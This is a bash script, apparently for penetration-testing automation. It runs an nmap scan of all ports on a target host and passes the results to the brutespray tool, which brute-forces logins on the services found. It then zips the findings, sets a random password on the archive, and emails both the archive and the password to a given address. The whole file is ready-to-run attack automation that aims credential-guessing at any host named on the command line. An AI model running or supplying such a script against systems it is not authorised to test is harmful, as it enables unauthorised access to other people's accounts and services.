#!/bin/bash
#https://github.com/x90skysn3k/brutespray
G=$1
M=$2

# nmap 
# !!! CHANGE PORT NUMBER TO ONE eg 22 for quicker execution  !!!
nmap -p - -sV $1 -oX brsp.xml
xsltproc brsp.xml -o brsp.html

cd brutespray
python3 brutespray.py --file /root/brsp.xml --threads 5 --hosts 5 -o BruteSprayResults
# python brutespray.py --file nmap.gnmap -U /usr/share/wordlist/user.txt -P /usr/share/wordlist/pass.txt --threads 5 --hosts 5
cd ..
cd BruteSprayResults
zip bsr.zip *.*
mv bsr.zip /root
rm *.*
cd ..

# zip
pass=$(openssl rand -base64 6)
zip --password ${pass} brsp.zip brsp.html bsr.zip

# Email Report and Password
echo " BruteSpray brsp.zip" | mail -s "BruteSpray Report for "$1" " -A brsp.zip $2
echo " Your password for "$1" brsp.zip is "${pass}" " | mail -s "Your brsp.zip Info" $2

